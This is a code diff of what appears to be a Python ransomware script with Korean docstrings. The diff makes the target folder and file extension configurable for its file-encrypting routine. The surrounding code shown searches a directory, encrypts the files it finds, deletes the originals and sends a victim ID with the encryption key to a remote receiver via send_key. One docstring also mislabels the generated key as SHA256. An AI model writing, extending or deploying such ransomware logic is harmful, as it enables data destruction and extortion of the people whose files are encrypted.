@@ -8,7 +8,7 @@ def main():
     warning()
     
     encryption_key=generate_encryption_key()
-    search_and_encrypt_files(encryption_key)
+    search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=".txt")
     
     your_id=make_id()
     send_key(f"{your_id} : {encryption_key.decode()}")
@@ -29,10 +29,12 @@ def generate_encryption_key(length=32):
     encoded_key=base64.urlsafe_b64encode(byte_secret_token)
     return encoded_key
 
-def search_and_encrypt_files(key):
+def search_and_encrypt_files(key,path="C:\\test",extension=".txt"):
     """
     @breif : 시스템 내 파일 탐색 및 암호화 실행
-    @param : 생성된 암호화키
+    @param key : SHA256 방식으로 암호화할 키
+    @param path : 암호화를 진행할 최상위폴더
+    @param extension : 암호화를 진행할 확장자("all" : 전부)
     @return : None
     """
 
@@ -66,7 +68,7 @@ def search_and_encrypt_files(key):
         os.remove(filename)
         return
 
-    files=search_file("C:\\test","all")
+    files=search_file(path,extension)
     for file in files:
         encrypt_file(file)
     return
